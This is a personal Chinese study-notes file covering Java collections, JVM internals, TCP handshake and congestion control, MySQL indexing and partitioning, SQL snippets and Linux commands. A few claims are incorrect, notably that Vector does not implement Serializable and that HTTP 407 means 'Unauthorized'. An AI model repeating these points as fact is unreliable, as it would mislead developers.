第一种滑窗模式,通过统计一段时间内的访问次数来进行控制,访问次数达到的某个峰值时进行限流
第二种为并发用户数模式,通过控制最大并发用户数,来达到流量控制的目的
--------------------------------------------------------------------------------------
Class.forName(className)调用Class.forName(className, true, this.getClass().getClassLoader())
第二个参数,是指Class被loading后是不是必须被初始化 即调用类的静态块的语句及初始化静态成员变量

ClassLoader.loadClass(className)调用的是ClassLoader.loadClass(name, false),第二个参数指出Class是否被link

只有执行cls.NewInstance()才能够初始化类,得到该类的一个实例
--------------------------------------------------------------------------------------
获取服务器jvm某刻内存快照jdk自带的jmap可以获取内存某一时刻的快照,导出为dmp文件后
 jmap -dump:live,file=dumpfile 14331
 jmap -dump:format=b,file=f:/mdt/dmp/1716.bin 1716

jstack用于打印出给定的java进程ID或core file或远程调试服务的Java堆栈信息

--------------------------------------------------------------------------------------
map散列值的冲突问题
hashmap里面的bucket出现了单链表的形式 链表法和开放地址法  开放地址法是通过一个探测算法
--------------------------------------------------------------------------------------
老年代  -XX:PretenureSizeThreshold=3145728
--------------------------------------------------------------------------------------
获取jvm参数
java -XX:+PrintVMOptions -XX:+AggressiveOpts -XX:+UnlockDiagnosticVMOptions -XX:+UnlockExperimentalVMOptions -XX:+PrintFlagsFinal  -version

-XX:+PrintFlagsInitial参数
显示所有可设置参数及默认值

-XX:+PrintFlagsFinal参数
可以获取到所有可设置参数及值(手动设置之后的值)
--------------------------------------------------------------------------------------
tcp拥塞控制和流量控制的差别
拥塞控制就是防止过多的数据注入到网络中 可以使网络中的路由器或链路不致过载
流量控制往往指的是点对点通信量的控制,是个端到端的问题 滑动窗口机制 tcp的窗口单位是字节,不是报文段

tcp流量控制原理
运用TCP报文段中的窗口大小字段来控制,发送方的发送窗口不可以大于接收方发回的窗口大小

只要tcp的一方收到对方的零窗口通知,就启动该计时器,周期性的发送一个零窗口探测报文段对方就在确认这个报文的时候给出现在的窗口大小
（注意：tcp规定,即使设置为零窗口,也必须接收以下几种报文段：零窗口探测报文段、确认报文段和携带紧急数据的报文段）

拥塞控制方法
慢开始(指数规律增长 随着网络往返时间(Round Trip Time,RTT)呈指数级增长),
拥塞避免(发送方判断网络出现拥塞(其根据就是没有收到确认) 线性规律增长),
快重传(如果当发送端接收到三个重复的确认ACK时,则断定分组丢失,立即重传丢失的报文段,而不必等待重传计时器超时,
一旦触发了快速重传,所有正在传输的其他报文都被放入队列中暂停发送,直到快速重传报文发送完为止)
快恢复(快速重传和快速恢复算法一般同时使用 慢开始门限减半,然后开始执行拥塞避免算法,是拥塞窗口的线性增大)

--------------------------------------------------------------------------------------
tcp标志位,有6种标示:
syn(synchronous建立联机)
ack(acknowledgement 确认)
psh(push传送)
fin(finish结束)
rst(reset重置)
urg(urgent紧急)
--------------------------------------------------------------------------------------
tcp三次握手
syn seq=x
syn seq=y ack=x+1
ack=y+1

四次挥手
fin seq=x+2 ack=y+1
s ack x+3
s fin seq=y+1
ack=y+2
--------------------------------------------------------------------------------------
以弱键 实现的基于哈希表的 Map在 WeakHashMap 中,当某个键不再正常使用时,将自动移除其条目
你访问它的内容的时候释放内部不用的对象 WeakHashMap 中的值对象由普通的强引用保持
--------------------------------------------------------------------------------------
添加key-value键值对：首先,根据key值计算出哈希值,再计算出数组索引(即,该key-value在table中的索引)
然后,根据数组索引找到Entry(即,单向链表),再遍历单向链表,将key和链表中的每一个节点的key进行对比
若key已经存在Entry链表中,则用该value值取代旧的value值；
若key不存在Entry链表中,则新建一个key-value节点,并将该节点插入Entry链表的表头位置
删除key-value键值对：删除键值对,相比于"添加键值对"来说,简单很多首先,还是根据key计算出哈希值,
再计算出数组索引(即,该key-value在table中的索引)然后,根据索引找出Entry(即,单向链表)
若节点key-value存在与链表Entry中,则删除链表中的节点即可

HashMap 继承于AbstractMap key、value都可以为null 只支持Iterator(迭代器)遍历 从前向后的遍历
        默认的容量大小是16；增加容量时,每次将容量变为"原始容量x2

Hashtable 继承于Dictionary 是线程安全的,支持多线程 key、value都不可以为null 支持Iterator(迭代器)和Enumeration(枚举器)
       从后往前的遍历
        默认的容量大小是11；增加容量时,每次将容量变为"原始容量x2 + 1 Hashtable支持contains(Object value)方法

Dictionary一般是通过Enumeration(枚举类)去遍历,Map则是通过Iterator(迭代器)去遍历

--------------------------------------------------------------------------------------
CopyOnWriteArrayList没有继承于AbstractList,它仅仅只是实现了List接口 自己实现Iterator
--------------------------------------------------------------------------------------
fail-fast 比较 if (modCount != expectedModCount)
--------------------------------------------------------------------------------------
通过pollFirst()来遍历LinkedList 会删除元素
通过pollLast()来遍历LinkedList  会删除元素

--------------------------------------------------------------------------------------
ArrayList支持序列化,而Vector不支持；即ArrayList有实现java.io.Serializable接口,而Vector没有实现该接口
Vector支持通过Enumeration去遍历,而List不支持
--------------------------------------------------------------------------------------
LockSupport是用来创建锁和其他同步类的基本线程阻塞原语
LockSupport中的park() 和 unpark() 的作用分别是阻塞线程和解除阻塞线程

park和wait的区别wait让线程阻塞前,必须通过synchronized获取同步锁
--------------------------------------------------------------------------------------
Enumeration只有2个函数接口通过Enumeration,我们只能读取集合的数据,而不能对数据进行修改
Iterator只有3个函数接口Iterator除了能读取集合的数据之外,也能数据进行删除操作
Iterator支持fail-fast机制,而Enumeration不支持

Enumeration 比 Iterator 的遍历速度更快
--------------------------------------------------------------------------------------
TreeSet 是一个有序的集合,它的作用是提供有序的Set集合
TreeSet是基于TreeMap实现的 只能通过迭代器进行遍历
--------------------------------------------------------------------------------------
Comparable 是排序接口 compareTo
Comparator 是比较器接口 compare
--------------------------------------------------------------------------------------
实例变量的初始化操作将先于构造器的程序体而运行
--------------------------------------------------------------------------------------
内存屏障
定义：包括LoadLoad, LoadStore, StoreLoad, StoreStore共4种内存屏障
--------------------------------------------------------------------------------------
类的加载阶段：加载、链接（验证、准备、解析）、初始化、使用、卸载
--------------------------------------------------------------------------------------
x-frame-options有三个可选的值：
deny：浏览器拒绝当前页面加载任何frame页面
sameorigin：frame页面的地址只能为同源域名下的页面
allow-from：允许frame加载的页面地址

add_header X-Frame-Options SAMEORIGIN  nginx

Header always append X-Frame-Options SAMEORIGIN apache
--------------------------------------------------------------------------------------
代理技术分为正向代理、反向代理和透明代理
正向代理就是代理服务器替代访问方[用户A]去访问目标服务器 [服务器B] 如翻墙

反向代理 代理服务器就像是原始服务器 反向代理将判断向何处(原始服务器)转交请求,并将获得的内容返回给客户端
负载均衡 squid nginx(多进程+异步非阻塞IO事件模型)

透明代理 客户端根本不需要知道有代理服务器的存在
行为管理软件 透明代理设备根据自身策略拦截并修改用户A或B的报文,并作为实际的请求方,向服务器A或B发送请求
--------------------------------------------------------------------------------------
网络抓包工具 linux tcpdump windows wireshark
--------------------------------------------------------------------------------------
非静态内部类可以使用 final 或 abstract 修饰符
--------------------------------------------------------------------------------------
能否将接口声明为 final
不能 接口必须要有子类
--------------------------------------------------------------------------------------
id字符串 create_date yyyy-MM-dd
7  2016-03-22 00_00_00
13 2016-03-22 11_00_12
记录上次时间 检查2次时间相同 时间+1s
--------------------------------------------------------------------------------------
redis 主从不同步
--------------------------------------------------------------------------------------
gd-rpc
--------------------------------------------------------------------------------------
匹配最后4位ABAB
with tel_tab as
 (select '13365251122' as tel from dual
  union all
  select '13365251133' as tel from dual
  union all
  select '13365251212' as tel from dual
  union all
  select '13365251123' as tel from dual
  union all
  select '13365252222' as tel from dual
  )
select *
  from tel_tab
 where substr(tel, 8, 1)!=substr(tel, 9, 1)
   and substr(tel, 8, 2) = substr(tel, 10, 2)

匹配最后4位AABB
select *
  from tel_tab
 where substr(tel, 8, 1) = substr(tel, 9, 1)
   and substr(tel, 10, 1) = substr(tel, 11, 1)
   and substr(tel, 8, 1) != substr(tel, 11, 1);

匹配最后4位AAAB
select *
  from tel_tab
 where substr(tel, 8, 1) != substr(tel, 11, 1)
   and substr(tel, 9, 1) = substr(tel, 10, 1)
   and substr(tel, 8, 1) = substr(tel, 9, 1)

匹配最后4位ABBB
select *
    from tel_tab
where substr(tel, 10, 1) = substr(tel, 11, 1)
  and substr(tel, 9, 1) = substr(tel, 10, 1)
  and substr(tel, 8, 1) != substr(tel, 11, 1);
--------------------------------------------------------------------------------------
mysql分区 横向分区 由多个物理分区组成
分区表中无法使用外键约束
range分区的区间范围值是连续的 null将被作为一个最小值来处理
partition by range(store_id)(
     partition p0 values less than(10)
 )

list分区是建立离散的值列表告诉数据库特定的值属于哪个分区 无maxvalue null值必须出现在列表中
 partition by list(store_id)(
     partition p0 values in (3,5),
 )

hash/key分区中：NULL值会被当作零值来处理

分表与分区的区别在于：分区从逻辑上来讲只有一张表,而分表则是将一张表分解成多张表

--------------------------------------------------------------------------------------
http://item.jd.com/800258.html
--------------------------------------------------------------------------------------
设置-XX:MaxDirectMemorySize=10M控制堆外内存的大小
--------------------------------------------------------------------------------------
Byte , Short , Long 有固定范围: -128 到 127对于 Character , 范围是 0 到 127
--------------------------------------------------------------------------------------
eclipse插件
1、ermster,可以在eclipse通过可视化的方式画er图,可以通过画好的er图生成sql语句,生成excel形式的实体、字段说明文件
2、coffee folding,可以把代码块折叠起来
--------------------------------------------------------------------------------------
System.out.println(1.0d / 0); // Infinity
System.out.println(0.0d / 0);// NaN
--------------------------------------------------------------------------------------
double i = Double.POSITIVE_INFINITY;
Assert.assertTrue(i==i+1);
isInfinite方法

isFinite 判断是否是有限值
--------------------------------------------------------------------------------------
NaN 不等于任何浮点数值,包括它自身在内 not a number
只要它的一个或多个操作数为NaN,那么其结果为NaN
double i = Double.NaN;
Assert.assertTrue(i != i);
Assert.assertFalse(Double.NaN == Double.NaN);
Double a = new Double(Double.NaN);
Double b = new Double(Double.NaN);
Assert.assertTrue(a.equals(b));

Assert.assertTrue(floatA== Double.POSITIVE_INFINITY);
Assert.assertTrue(Float.isNaN(floatA*0));
Assert.assertTrue(Float.isInfinite(floatA*1));
--------------------------------------------------------------------------------------
float negZero = -0.0f;
float zero = 0.0f;
Assert.assertTrue(zero == negZero);
Assert.assertEquals(1,Float.compare(zero, negZero));
--------------------------------------------------------------------------------------
java spi
为某个接口寻找服务实现的机制有点类似IOC的思想,就是将装配的控制权移到程序之外
java.util.ServiceLoader

当服务的提供者,提供了服务接口的一种实现之后,在jar包的META-INF/services/目录里
同时创建一个以服务接口命名的文件该文 件里就是实现该服务接口的具体实现类
而当外部程序装配这个模块的时候,就能通过该jar包META-INF/services/里的配置文件找到具体的
实现类名,并装载实例化,完成模块的注入

jdbc
通过META-INF/services/java.sql.Driver文件里指定实现类的方式来暴露驱动提供者

--------------------------------------------------------------------------------------
mysql 会优先使用精确度高的索引,因为每次查询只能使用一个索引
select col from table order by col；会使用 col 的索引
索引不作用于存在 NULL 值的列
--------------------------------------------------------------------------------------
rup 统一过程 统一过程则是指导如何产生这些文档以及这些文档要讲述什么的方法
uml 统一建模

RUP是一种用例驱动的,以架构为中心的,采用迭代增量方式开发的软件工程过程
应用统一建模语言(UML)进行可视化建模,为面向对象的软件系统的开发提供了方法论的指导

常见的软件过程模型有瀑布模型、原型模型、增量模型、喷泉模型、RUP（统一软件过程）、敏捷过程等


RUP的基本特征：
1.迭代式增量开发
2.用例驱动
3.以软件体系结构为中

--------------------------------------------------------------------------------------
迭代式开发只是几乎所有敏捷开发所采用的一个主要的基础实践 敏捷还有演进式架构设计、敏捷建模、重构、自动回归测试
--------------------------------------------------------------------------------------
Calendar calender = new GregorianCalendar();
Calender calender = Calender.getInstance();
getInstance()方法会根据Locale来生成不同的子类

Calendar 抽象类
GregorianCalendar 实现Calendar
--------------------------------------------------------------------------------------
CAS特点是它是由硬件实现的极轻量级指令,同时CPU也保证此操作的原子性
--------------------------------------------------------------------------------------
Disruptor优化方法
缓存行填充 线程对各自指针的修改不会干扰到他人
避免GC 提前分配
成批操作
--------------------------------------------------------------------------------------
https://github.com/winwill2012/disruptor-code-analysis
--------------------------------------------------------------------------------------
jdbc:mysql://localhost:3306/db?zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=utf-8&autoReconnect=true&autoReconnectForPools=true&connectTimeout=1000&socketTimeout=3000

其中socketTimeout即为配置的JDBC Socket Timeout其中connectTimeout为JDBC建立连接的超时时间connectTimeout和socketTimeout的默认值为0时,即timeout不生效

--------------------------------------------------------------------------------------
实现死锁的方法有两种,一种是使用synchronized同步代码块,另一种是使用reentrantlock重入锁
synchronized在获锁的过程中是不能被中断的
使用tryLock(long timeout, TimeUnit unit) lockInterruptibly()
--------------------------------------------------------------------------------------
MySQL5.6已经支持延时复制
--------------------------------------------------------------------------------------
js arr.length = 5;

--------------------------------------------------------------------------------------
中国#23
sort -t'#' -k 2 -n count.txt
 -t命令指定分隔符,-k命令指定按第几列排序,-n代表排序数字 -r参数,代表降序输出

只要计数,不要数据的使用-c参数
grep -c t c.txt


--------------------------------------------------------------------------------------
流传输中出现,UDP不会出现粘包,因为它有消息边界
发送端需要等缓冲区满才发送出去,造成粘包
--------------------------------------------------------------------------------------
反射静态方法
Object returnObj = Class.forName(className).getMethod(methodName, params).invoke(null, args);

入参数组时候
String[] stringArray = new String[]{"Cafe","Baby"};
arrayInputMethod.invoke(object, new Object[] { stringArray });
--------------------------------------------------------------------------------------
0 <= position <= limit <= capacity
--------------------------------------------------------------------------------------
泛型局限性
不能使用基本类型作为类型参数
运行时类型检测 只能检测str是否为Pair类型,而不能检测str是否为Pair<String>类型,因为类型变量信息己擦除
不能创建泛型数组 一种特定类型的数组应当仅能存储该类型的元素所以使用泛型数组是不安全的,因此不允许创建泛型数组
不能实例化类型变量
不能抛出或捕获泛型类的实例
泛型类并没有自己独有的Class类对象比如并不存在List<String>.class或是List<Integer>.class,而只有List.class
不能使用静态的类型变量  private static T t; // 编译出错
--------------------------------------------------------------------------------------
变量E表示集合的元素类型,K和V分别表示表的关键字与值的类型T（或U,S）表示"任意类型
--------------------------------------------------------------------------------------
TCP连接后,主动关闭连接的一方就会进入TIME_WAIT状态
客户端主动关闭连接时,会发送最后一个ack后,然后会进入TIME_WAIT状态,再停留2个MSL时间(后有MSL的解释),进入CLOSED状态
--------------------------------------------------------------------------------------
java代理有两种方式：1） jdk 动态代理；2）字节码生成 选择动态代理方式
--------------------------------------------------------------------------------------
ftp取空问题
http://blog.csdn.net/wangchsh2008/article/details/47101423
--------------------------------------------------------------------------------------
https://github.com/kenparker/JavaCodeExamples
--------------------------------------------------------------------------------------
https://github.com/davidmoten/rtree
https://github.com/ifesdjeen/fusion
https://github.com/fommil/matrix-toolkits-java
https://github.com/lessthanoptimal/ejml
https://github.com/woo-j/OkapiBarcode
https://github.com/abel533/ECharts
https://github.com/alibaba/transmittable-thread-local  ThreadLocal值的传递

https://github.com/RedHogs/cron-parser
https://github.com/javaplugs/mybatis-types
https://github.com/jacklaaa89/ExpressionParser

http://stackoverflow.com/questions/10815518/java-matrix-libraries
--------------------------------------------------------------------------------------
方法区
存放已被虚拟机加载的类信息,常量,静态变量
--------------------------------------------------------------------------------------
mysql
GLOBAL 关键字是可以修改全局的设置,用这个方式修改完后,已经存在的连接还不会生效,只有对新建立的连接才会起作用
SESSION 关键字则是只修改当前连接会话的设置,修改完后立即生效,再次连接后会恢复成全局的设置,对其他连接/会话也不起作用

--------------------------------------------------------------------------------------
java xjc 将 XML 模式文件(xsd)编译为完全注释的 Java 类
xjc -d src -p com.javacodegeeks.examples.xjc Employee.xsd
--------------------------------------------------------------------------------------
三次握手的目的是同步连接双方的序列号和确认号并交换TCP窗口大小信息以保证应用层接收到的数据不会因为网络上的传输的问题而乱序

Sequence Number 解决网络报乱序
Acknowledgment Number 解决丢包的问题

第一次分手：客户端发送一个FIN,用来关闭客户端到服务器的数据传送,客户端进入FIN_WAIT_1状态
第二次分手：服务端收到这个FIN,它发回一个ACK,确认序号为收到的序号加1客户端进入FIN_WAIT_2状态,服务端进入CLOSE_WAIT状态
第三次分手：服务端向客户端发送FIN报文段,请求关闭连接,服务端进入LAST_ACK状态
第四次分手：客户端接受FIN并发回ACK报文确认,并将确认序号设置为收到序号加1,客户端进入TIME_WAIT状态

客户端TCP状态变化：
CLOSED->SYN_SENT->ESTABLISHED->FIN_WAIT_1->FIN_WAIT_2->TIME_WAIT->CLOSED
服务器TCP状态变化：
CLOSED->LISTEN->SYN_REVD->ESTABLISHED->CLOSE_WAIT->LAST_ACK->CLOSED
--------------------------------------------------------------------------------------
B-Tree有一个重要的特点是：所有叶节点具有相同的深度,等于树高h这样索引检索一次最多需要访问h个节点

B-Tree和B+Tree的区别在于,B+Tree只有叶节点才存储数据,另外在B+Tree的每个叶子节点包含一个指向相邻叶子节点的指针,这样它即带有顺序访问功能目的是为了提高区间查找和遍历的性能
--------------------------------------------------------------------------------------
B-Tree的优点在于,由于B-Tree的每一个节点都包含key和value,因此经常访问的元素可能离根节点更近,因此访问也更迅速

MySQL: B-Tree 索引
--------------------------------------------------------------------------------------
full-text,b-tree,hash,r-tree
r-tree的优势在于范围查找 仅支持geometry数据类型
--------------------------------------------------------------------------------------
hash索引 不能使用范围查询 无法利用索引的数据来避免任何排序运算 不能避免表扫描
--------------------------------------------------------------------------------------
增量方案 时间戳
--------------------------------------------------------------------------------------
ConcurrentHashMap<String, Integer> instance = new ConcurrentHashMap<String, Integer>(16, 0.9f, 1);
初始容量16能够在扩容发生之前容纳足够多的元素。
加载因子0.9保证了ConcurrentHashMap内部的致密堆积,以优化内存使用。并发级别设置为1,使得只有一个分片被创建和维护

16 0.75 16
--------------------------------------------------------------------------------------
Tomcat组成
Server Service  Connector Engine Host  Context
--------------------------------------------------------------------------------------
servlet的容器默认是采用单实例多线程
--------------------------------------------------------------------------------------
String s1 = new String("abc");
String s2 = new String("abc");

new了两个对象,加上string pool里的一个"abc"
--------------------------------------------------------------------------------------
String s1 = "abc";
String s2 = new String("abc");
s2 = s2.intern();
System.out.println(s1 == s2);//true
--------------------------------------------------------------------------------------
根本区别
WWW 认证：指的是 Web 服务器对客户端发起的认证
Proxy 认证：指的是代理服务器对客户端发起的认证

响应的状态码不同
WWW 认证：第一次访问时响应 401 Unauthorized
Proxy 认证：第一次访问时响应 407 Unauthorized

认证头部不同
WWW 认证：WWW-Authenticate, Authorization, Authentication-Info
Proxy 认证：Proxy-Authenticate, Proxy-Authorization, Proxy-Authentication-Info
--------------------------------------------------------------------------------------
Authenticator全局

使用 HttpClient 的 CredentialsProvide 局部
CredentialsProvider credentialsProvider = new BasicCredentialsProvider();
credentialsProvider.setCredentials(AuthScope.ANY, new UsernamePasswordCredentials(userName, password));

CloseableHttpClient httpclient = HttpClients.custom()
    .setDefaultCredentialsProvider(credentialsProvider)
    .build();
--------------------------------------------------------------------------------------
jvm
程序计数器
Java虚拟机栈 StackOverflowError
本地方法栈
public void stackLeak() {
              stackLength++;
              stackLeak();
}

Java堆  -XX:+HeapDumpOnOutOfMemoryError ture-> list.add(new OOMObject()); OutOfMemoryError
方法区(永久代)  存放了每个Class的结构信息,包括常量池、字段描述、方法描述 true-CGLib  Enhancer
运行时常量池 String.intern()方法 OutOfMemoryError true-> list.add(String.valueOf(i++).intern());
本机直接内存（Direct Memory）  OutOfMemoryError true->unsafe.allocateMemory(_1MB);
--------------------------------------------------------------------------------------
判断对象是否存活

可达性分析算法
通过一系列称为"GC Roots"的对象作为起点,从这些节点开始向下搜索,搜索所有走过的路径称为引用链,当一个对象到GC Roots没有任何引用链相连时(从GC Roots到此对象不可达),则证明此对象是不可用的

JVM判定无用的类的条件：
该类的所有实例已经被回收,java堆中不存在该类的任何示例
加载该类的ClassLoader已经被回收
该类对应的java.lang.Class对象没有在任何地方被引用,无反射
--------------------------------------------------------------------------------------
垃圾收集算法
标记-清除算法 效率 不连续的内存碎片
复制算法  可用内存缩小为原来的一半
标记-复制算法 让所有存活的对象都向一端移动

--------------------------------------------------------------------------------------
Memory leak
不断向 static map 这种静态容器里塞东西
ThreadLocalMap
--------------------------------------------------------------------------------------
http://akini.mbnet.fi/java/unicodereader/ bom utf
--------------------------------------------------------------------------------------
 delete from ol_hlr_svcnum_rela
  where (hlr, svc_num_head) in (select hlr, svc_num_head
                                  from ol_hlr_svcnum_rela
                                 group by hlr, svc_num_head
                                having count(*) > 1)
    and id not in (select min(id)
                     from ol_hlr_svcnum_rela
                    group by hlr, svc_num_head
                   having count(*) > 1)

update ol_precard_data t set opc=(select opc from ol_supplier_card_info  t2
where t2.ki=t.ki)
--------------------------------------------------------------------------------------
移位操作符有>>（右移）、<<（左移）、>>>（右移）三种
>>>是不带符号右移 无符号右移 ,忽略符号位,空位都以0补齐
--------------------------------------------------------------------------------------
              低地址位    高地址位
大端；        00              96
小端：        96              00
--------------------------------------------------------------------------------------
mark-->position-->limit-->capacity
rewind 重置mark标记 position = 0;mark = -1;

--------------------------------------------------------------------------------------
解决消息重复投递
 增加消息应用状态表 先去消息应用状态表中查询一遍,如果找到说明是重复消息,丢弃即可
--------------------------------------------------------------------------------------
时序数据库 influxdb 风控
--------------------------------------------------------------------------------------
代码在多线程下执行和在单线程下执行永远都能获得一样的结果,那么你的代码就是线程安全的
不可变
CopyOnWriteArrayList、CopyOnWriteArraySet
fail-fast机制
--------------------------------------------------------------------------------------
打印线程堆栈,可以通过使用jstack pid命令,在Linux环境下还可以使用kill -3 pid
--------------------------------------------------------------------------------------
如果这个异常没有被捕获的话,这个线程就停止执行了另外重要的一点是：如果这个线程持有某个某个对象的监视器,那么这个对象监视器会被立即释放
--------------------------------------------------------------------------------------
swagger接口文档生成
--------------------------------------------------------------------------------------
find -name "*.xml" | xargs grep -n "coreSqlMapClient"
cat pushLog.log | grep "http://t.cn/RUWRDSl" | head
--------------------------------------------------------------------------------------
正则表达式：（\w+）
替换为：‘\1’,
--------------------------------------------------------------------------------------
mysql 大于0
INT(11) UNSIGNED NOT NULL DEFAULT '0'
--------------------------------------------------------------------------------------
http://support.minitab.com/zh-cn/minitab/17/ 统计
--------------------------------------------------------------------------------------
session劫持防范 cookieonly和token 间隔生成新的SID
--------------------------------------------------------------------------------------
1st 2nd 3rd 4th
--------------------------------------------------------------------------------------
ExplicitGCInvokesConcurrent本身的功能：其实,也是触发full gc 只不过在CMS在full gc 效率比较高
--------------------------------------------------------------------------------------
 future.cancel(true);
--------------------------------------------------------------------------------------
在现代密码学中,让对方相信命题的正确性,但又不泄露任何其他的信息,这就叫作 零知识证明
--------------------------------------------------------------------------------------
MySQL中使用select uuid()语句获得的为36位（包含标准格式的"-"）
Oracle中,使用select rawtohex(sys_guid()) from dual语句获得的为32位（不包含"-"）
--------------------------------------------------------------------------------------
map线程安全
使用 synchronized 关键字 锁Lock ReadWriteLock
ConcurrentHashMap
--------------------------------------------------------------------------------------
ArrayList  Iterator并发删除不安全 concurrentmodificationexception iterator对容器进行访问不需要获取锁
加锁 或者 使用并发容器CopyOnWriteArrayList代替ArrayList

当迭代器对象创建的时候,会将集合修改次数modCount存到expectedModCount里,然后每次遍历取值的时候,
都会拿ArrayList集合修改次数modCount与迭代器的expectedModCount比较,如果发生改变,
说明集合结构在创建该迭代器后已经发生了改变,直接抛出ConcurrentModificationException异常
--------------------------------------------------------------------------------------
MySQL有三种锁的级别：页级、表级、行级
当对未存在的行进行锁的时候,mysql是会锁住一段范围（有gap锁）

锁住的范围为：
(无穷小或小于表中锁住id的最大值,无穷大或大于表中锁住id的最小值)

insert into t3(xx,xx) on duplicate key update `xx`='XX';
--------------------------------------------------------------------------------------
https://github.com/GrandmasterTash/jGrid
https://github.com/aterai/java-swing-tips swing例子
https://github.com/LGoodDatePicker/LGoodDatePicker swing时间选择
https://github.com/duhongming1990/jxls1.0.6
https://github.com/easylogic/jennifer-chart
https://github.com/dakusui/jcunit
https://github.com/shekhargulati/urlcleaner
https://github.com/cowtowncoder/java-json-performance-benchmarks
https://github.com/lwhite1/tablesaw csv
https://github.com/spotify/sparkey-java

https://github.com/RutledgePaulV/prune tree
https://github.com/jchambers/jvptree 制高点树 近邻搜索
vpt查询是 准确近邻查询,较适合范围查询,可方便扩展为k近邻查询
http://stevehanov.ca/blog/index.php?id=130
https://github.com/arey/javabean-marshaller

--------------------------------------------------------------------------------------
scp [-r] 源文件或目录 目的文件或目录, -r选项用于拷贝目录
--------------------------------------------------------------------------------------
find . -type f -size 0c -exec rm {} \;,查找所有长度为0字节的普通文件,并删除
find . -type f -name "*.xml" -ls,将搜索到的所有xml文件用ls -l的结果形式输出
--------------------------------------------------------------------------------------
grep
-w：整个单词匹配
-n：同时输出行号
-c：只输出匹配的行数
-H, --with-filename：在每个匹配前打印文件名
-l 只打印文件名
--------------------------------------------------------------------------------------
1英尺=12英寸=30.48厘米
--------------------------------------------------------------------------------------
http://graphstream-project.org/ 图
--------------------------------------------------------------------------------------
currval
select  sequence_name from user_sequences
--------------------------------------------------------------------------------------
Java Monitor 从两个方面来支持线程之间的同步,即：互斥执行与协作 Java 使用对象锁 ( 使用 synchronized 获得对象锁 ) 保证工作在共享的数据集上的线程互斥执行 , 使用 notify/notifyAll/wait 方法来协同不同线程之间的工作
Java 的 Object 类本身就是监视者对象

线程如果获得监视锁成功,将成为该监视者对象的拥有者在任一时刻内,监视者对象只属于一个活动线程 (Owner) 拥有者线程可以调用 wait 方法自动释放监视锁,进入等待状态

进入区(Entrt Set):表示线程通过synchronized要求获取对象的锁如果对象未被锁住,则迚入拥有者;否则则在进入区等待一旦对象锁被其他线程释放,立即参与竞争
拥有者(The Owner):表示某一线程成功竞争到对象锁
等待区(Wait Set):表示线程通过对象的wait方法,释放对象的锁,并在等待区等待被唤醒

一个 Monitor在某个时刻,只能被一个线程拥有,该线程就是 "Active Thread",而其它线程都是 "Waiting Thread",分别在两个队列 " Entry Set"和 "Wait Set"里面等候在 "Entry Set"中等待的线程状态是 "Waiting for monitor entry",而在 "Wait Set"中等待的线程状态是 "in Object.wait()"

locked <地址> 目标：使用synchronized申请对象锁成功,监视器的拥有者
waiting to lock <地址> 目标：使用synchronized申请对象锁未成功,在进入区等待
waiting on <地址> 目标：使用synchronized申请对象锁成功后,释放锁并在等待区等待
parking to wait for <地址> 目标

locked
通过synchronized关键字,成功获取到了对象的锁,成为监视器的拥有者,在临界区内操作对象锁是可以线程重入的

waiting to lock
没有获取到了对象的锁,线程在监视器的进入区等待在调用栈顶出现,线程状态为Blocked

waiting on
调用了wait方法,进入对象的等待区等待在调用栈顶出现,线程状态为WAITING或TIMED_WATING

parking to wait for
park是基本的线程阻塞原语,不通过监视器在对象上阻塞

waiting on condition:等待区等待、被park 常见的情况有等待网络IO sleep状态

如果大量线程在"waiting for monitor entry"：可能是一个全局锁阻塞住了大量线程
如果大量线程在"waiting on condition"  可能是获取第三方资源

--------------------------------------------------------------------------------------
jstack命令主要用来查看Java线程的调用堆栈的,可以用来分析线程问题（如死锁）
--------------------------------------------------------------------------------------
String a=new String("Hello") 一个字符串对象在字符串常量池外创建,即使池里存在相同的字符串

同一个包下同一个类中的字符串常量的引用指向同一个字符串对象；
同一个包下不同的类中的字符串常量的引用指向同一个字符串对象；
不同的包下不同的类中的字符串常量的引用仍然指向同一个字符串对象；
由常量表达式计算出的字符串在编译时进行计算,然后被当作常量

--------------------------------------------------------------------------------------
常量池主要用于存放两大类常量：字面量和符号引用量

类和接口的全限定名

字段名称和描述符

方法名称和描述符


两种浮点数类型的包装类Float,Double并没有实现常量池技术

方法区中又存在一块区域叫运行时常量池 String的intern方法
--------------------------------------------------------------------------------------
String str2 = new String("abc");
栈内存创建str2引用,在堆内存上创建一个String对象,内容是"abc",而str2指向堆内存对象的首地址
常量池

String str3 = "str" + "ing";

String str4 = str1 + str2;

System.out.println(str3 == str4);//false

String ab1 = "aaabbb";
final String b = "bbb";
String ab2 = "aaa" + b;
System.out.println(ab1 == ab2);    //true

字符串常量池存放的是对象引用 对象都创建在堆内存中
--------------------------------------------------------------------------------------
运行期不可变 主要有静态方法和私有方法两大类,前者与类型直接关联,后者在外部不可被访问

invokestatic：调用静态方法
invokespecial：调用实例构造器方法、私有方法和父类方法
invokevirtual：调用所有的虚方法
invokeinterface：调用接口方法,会在运行时再确定一个实现此接口的对象

invokestatic 和 invokespecial 指令调用的方法,都可以在解析阶段确定唯一的调用版本,符合这个条件的有静态方法、私有方法、实例构造器和父类方法四类

其他方法就称为虚方法（final 方法除外） 调用 final 方法使用的是 invokevirtual 指令  final 方法是一种非虚方法
--------------------------------------------------------------------------------------
根据分派依据的宗量数（方法的调用者和方法的参数统称为方法的宗量）又可分为单分派和多分派
两类分派方式两两组合便构成了静态单分派、静态多分派、动态单分派、动态多分派四种分派情况

静态分派
所有依赖静态类型来定位方法执行版本的分派动作,都称为静态分派
静态分派的最典型应用就是多态性中的方法重载静态分派发生在编译阶段

静态分派属于多分派类型
动态分派属于单分派类型 方法重写
动态绑定就是指程执行期间（而不是在编译期间）判断所引用对象的实际类型,根据其实际的类型调用其相应的方法

静态方法可以通过类名直接访问,子类会继承父类的静态方法,但是不会复写父类方法如果子类声明了和父类一样的方法,则这时候发生的是隐藏,而不是复写因为静态方法是属于类的,即使是通过类的实例调用,最终生成的字节码指令也是invokestatic

java双分派的特点：首先要有一个访问类B,类B提供一个showA(A a) 方法,在方法中,调用类A的method1方法,然后类A的method2方法中调用类B的showA方法并将自己作为参数传给showA双分派的核心就是这个this对象

--------------------------------------------------------------------------------------
virtual dispatch 机制会首先从 receiver（被调用方法的对象）的类的实现中查找对应的方法,如果没找到,则去父类查找,直到找到函数并实现调用,而不是依赖于引用的类型
虚分派不管引用类型的,只查被调用对象的类型
--------------------------------------------------------------------------------------
ASM的核心功能 以一种直接的方式反映出字节码的数据结构
--------------------------------------------------------------------------------------
常量池的数量是constant_pool_count-1,是因为索引0表示class中的数据项不引用任何常量池中的常量
--------------------------------------------------------------------------------------
class loader双亲委托模型
--------------------------------------------------------------------------------------
